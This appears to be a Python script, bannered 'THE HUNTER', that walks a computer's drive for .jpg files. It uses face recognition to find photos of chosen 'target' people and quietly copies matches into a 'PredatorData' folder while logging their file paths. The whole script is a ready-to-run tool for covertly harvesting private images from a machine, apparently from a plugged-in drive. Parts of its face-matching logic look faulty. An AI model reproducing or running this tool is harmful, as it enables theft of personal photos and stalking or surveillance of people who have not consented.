import shutil
import face_recognition as fr
import os

def logo1():
    print("========================================================")
    print(''' _____ _   _ _____   _   _ _   _ _   _ _____ _____ ____  
|_   _| | | | ____| | | | | | | | \ | |_   _| ____|  _ \ 
  | | | |_| |  _|   | |_| | | | |  \| | | | |  _| | |_) |
  | | |  _  | |___  |  _  | |_| | |\  | | | | |___|  _ < 
  |_| |_| |_|_____| |_| |_|\___/|_| \_| |_| |_____|_| \_\
                                                         
''')
    print("========================================================")

def encode_faces(folder):
    list_people_encoding = []
    try:
        for filename in os.listdir(folder):
             known_image = fr.load_image_file(f'{folder}{filename}')
             know_encoding = fr.face_encodings(known_image) [0]
             list_people_encoding.append((know_encoding, filename))
        return list_people_encoding
    except Exception as e:
        print(e)

def find_target_face(target_encoding, target_image):
    try:
        face_location = fr.face_locations(target_image)
        for person in encode_faces('targets/'):
             encoded_face = person[0]
             filename = person[1]
             is_target_face = fr.compare_faces(encoded_face, target_encoding, tolerance=0.55)
             print(f'{is_target_face} {filename}')
             if face_location:
                 face_number = 0
                 for location in face_location:
                     if is_target_face[face_number]:
                         return True
                     face_number += 1
    except Exception as e:
        print(e)




def runGhost(filetype, no_of_files):
    """
    This function copies the files according to extension and number of files.
    :param filetype:
    :param no_of_files:
    :return:
    """
    # default_path = ["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\"]
    default_path = ["D:\\"]
    count = 0
    with open("File_Details.txt", "a") as f:
        for pathlist in default_path:
            filecounter = 0
            if os.path.exists(pathlist) and (f"{pathlist}" != os.getcwd()[0:3]):
                for root, dirs, files in os.walk(pathlist):
                    for file in files:
                        if (file.endswith(filetype)) and (f"{pathlist}" != os.getcwd()[0:3]) and (
                                filecounter < int(no_of_files)):
                            try:
                                load_image = f"{root}/{str(file)}"
                                target_image = fr.load_image_file(load_image)
                                target_encoding = fr.face_encodings(target_image)
                                result = find_target_face(target_encoding, target_image)
                                if result:
                                    shutil.copyfile(f"{load_image}", f"{os.getcwd()}\\PredatorData\\{count}{file}")
                                    print(f"[{count}]- File Address: {load_image}")
                                    f.write(f"[{count}]- File Address: {root}/{str(file)}\n")
                                    count += 1
                                    filecounter += 1
                            except Exception as e:
                                print(f"Error Coping this file: {e}")
                        if filecounter == int(no_of_files):
                            break
                    if filecounter == int(no_of_files):
                        break
os.system('cls')
os.system('color 0a')
logo1()
runGhost('.jpg', 20)
